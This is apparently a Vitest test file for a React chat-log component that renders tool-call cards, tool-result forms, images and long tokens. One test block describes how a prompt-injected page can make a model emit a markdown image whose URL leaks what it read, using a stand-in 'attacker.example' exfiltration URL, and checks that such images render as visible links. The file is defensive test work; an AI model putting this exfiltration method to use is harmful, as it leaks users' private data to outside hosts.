/**
 * The transcript's tool-call half, driven.
 *
 * What matters: a tool-call-only assistant turn renders as a card and not
 * as an empty bubble (the ambiguity §0.3 of the diagnostic design found),
 * the result form is prefilled for the example tool with the acceptance
 * run's result, Send hands back one `tool` message's worth of data per
 * call with the matching id, and a `tool` message in the history is
 * visible -- a harness sends it, so the transcript that is the request
 * has to show it.
 */

import { fireEvent, render, screen } from "@testing-library/react";
import { describe, expect, it, vi } from "vitest";

import { ChatLog } from "./ChatLog";

vi.mock("@/lib/useAutoScroll", () => ({
  useAutoScroll: () => ({
    scrollRef: { current: null },
    isAtBottom: true,
    scrollToBottom: () => {},
  }),
}));

describe("ChatLog with tool calls", () => {
  it("renders image content as the image, without data URLs as text or a text-only edit", () => {
    render(
      <ChatLog
        messages={[
          {
            role: "user",
            content: [
              { type: "text", text: "Describe this" },
              { type: "image_url", image_url: { url: "data:image/png;base64,PRIVATE" } },
            ],
          },
        ]}
        pending={false}
        onEditUserMessage={vi.fn()}
      />,
    );
    // The pixels render (the composer can attach them now); the bytes
    // still never appear as text, and an Edit that would flatten the
    // message to its text half is still not offered.
    expect(screen.getByText("Describe this")).toBeInTheDocument();
    expect(screen.getByTestId("message-image")).toHaveAttribute(
      "src",
      "data:image/png;base64,PRIVATE",
    );
    expect(screen.queryByRole("button", { name: "Edit" })).not.toBeInTheDocument();
    expect(document.body.textContent).not.toContain("PRIVATE");
  });

  it("an image the storage fallback stripped says so instead of rendering a broken frame", () => {
    render(
      <ChatLog
        messages={[
          {
            role: "user",
            content: [
              { type: "text", text: "still here" },
              { type: "image_url", image_url: { url: "data:," } },
            ],
          },
        ]}
        pending={false}
      />,
    );
    expect(screen.getByText("still here")).toBeInTheDocument();
    expect(screen.queryByTestId("message-image")).not.toBeInTheDocument();
    expect(screen.getByTestId("message-image-stripped")).toBeInTheDocument();
  });
  it("renders a tool-call-only turn as a card that says whether the arguments parse", () => {
    render(
      <ChatLog
        pending={false}
        messages={[
          { role: "user", content: "weather in Oslo?" },
          {
            role: "assistant",
            content: null,
            tool_calls: [
              {
                id: "call_1",
                type: "function",
                function: { name: "get_weather", arguments: '{"city":"Oslo"}' },
              },
            ],
          },
        ]}
      />,
    );
    const card = screen.getByTestId("tool-call-card");
    expect(card).toHaveTextContent("get_weather");
    expect(card).toHaveTextContent('{"city":"Oslo"}');
    expect(card).toHaveTextContent("arguments parse");
    // No results form without a handler: tools are not in play.
    expect(screen.queryByTestId("tool-results-form")).toBeNull();
  });

  it("flags arguments a model emitted that are not JSON", () => {
    render(
      <ChatLog
        pending={false}
        messages={[
          {
            role: "assistant",
            content: null,
            tool_calls: [
              { id: "c", type: "function", function: { name: "f", arguments: "{city: Oslo" } },
            ],
          },
        ]}
      />,
    );
    expect(screen.getByTestId("tool-call-card")).toHaveTextContent("arguments are not JSON");
  });

  it("prefills the example result and sends one result per call with its id", () => {
    const onToolResults = vi.fn();
    render(
      <ChatLog
        pending={false}
        onToolResults={onToolResults}
        messages={[
          { role: "user", content: "weather?" },
          {
            role: "assistant",
            content: null,
            tool_calls: [
              {
                id: "call_w",
                type: "function",
                function: { name: "get_weather", arguments: '{"city":"Oslo"}' },
              },
              { id: "call_x", type: "function", function: { name: "lookup", arguments: "{}" } },
            ],
          },
        ]}
      />,
    );
    const inputs = screen.getAllByTestId("tool-result") as HTMLTextAreaElement[];
    expect(inputs).toHaveLength(2);
    expect(inputs[0]?.value).toBe('{"tempC": -3, "sky": "snow"}');
    expect(inputs[1]?.value).toBe("");
    // Incomplete: the second call has no result yet.
    const send = screen.getByTestId("send-tool-results") as HTMLButtonElement;
    expect(send.disabled).toBe(true);
    fireEvent.change(inputs[1]!, { target: { value: '{"found": true}' } });
    expect(send.disabled).toBe(false);
    fireEvent.click(send);
    expect(onToolResults).toHaveBeenCalledWith([
      { tool_call_id: "call_w", content: '{"tempC": -3, "sky": "snow"}' },
      { tool_call_id: "call_x", content: '{"found": true}' },
    ]);
  });

  it("does not offer a results form while a turn is pending or once results were sent", () => {
    const messages = [
      {
        role: "assistant" as const,
        content: null,
        tool_calls: [
          {
            id: "c",
            type: "function" as const,
            function: { name: "get_weather", arguments: "{}" },
          },
        ],
      },
    ];
    const { rerender } = render(
      <ChatLog pending={true} onToolResults={() => {}} messages={messages} />,
    );
    expect(screen.queryByTestId("tool-results-form")).toBeNull();
    rerender(
      <ChatLog
        pending={false}
        onToolResults={() => {}}
        messages={[...messages, { role: "tool", content: '{"tempC":-3}', tool_call_id: "c" }]}
      />,
    );
    expect(screen.queryByTestId("tool-results-form")).toBeNull();
    // And the tool result is on screen, as the request has it.
    expect(screen.getByTestId("tool-result-message")).toHaveTextContent('{"tempC":-3}');
    expect(screen.getByTestId("tool-result-message")).toHaveTextContent("tool result · c");
  });
});

describe("ChatLog with images in a model's reply", () => {
  // A prompt-injected page can make a model write an image whose address
  // carries what it read. Rendering it as an <img> fetches that address the
  // moment the reply arrives, with nobody clicking anything.
  const leak = "https://attacker.example/pixel.png?q=SECRET";

  it("renders a markdown image in a reply as a link, never an image", () => {
    render(
      <ChatLog
        messages={[{ role: "assistant", content: `Here you go: ![a chart](${leak})` }]}
        pending={false}
      />,
    );
    expect(document.querySelector(`img[src="${leak}"]`)).toBeNull();
    expect(document.querySelectorAll("img")).toHaveLength(0);
    const link = screen.getByRole("link", { name: /a chart/ });
    expect(link).toHaveAttribute("href", leak);
    expect(link).toHaveAttribute("target", "_blank");
    expect(link).toHaveAttribute("rel", "noreferrer");
    // The address is visible, so nobody opens it without seeing where it goes.
    expect(link).toHaveTextContent(leak);
  });

  it("names an image with no alt text as an image", () => {
    render(<ChatLog messages={[{ role: "assistant", content: `![](${leak})` }]} pending={false} />);
    expect(document.querySelectorAll("img")).toHaveLength(0);
    expect(screen.getByRole("link", { name: /image/ })).toHaveAttribute("href", leak);
  });
});

describe("a long unbroken token", () => {
  it("wraps inside its bubble rather than running past it", () => {
    // jsdom lays nothing out, so this pins the rule that does the work:
    // overflow-wrap on the bubble, and a bubble allowed to be narrower
    // than its longest word.
    const url = `https://example.com/${"a".repeat(400)}`;
    render(<ChatLog messages={[{ role: "assistant", content: url }]} pending={false} />);
    const bubble = screen.getByTestId("message-bubble");
    expect(bubble.className).toMatch(/(^|\s)break-words(\s|$)/);
    expect(bubble.className).toMatch(/(^|\s)min-w-0(\s|$)/);
  });
});
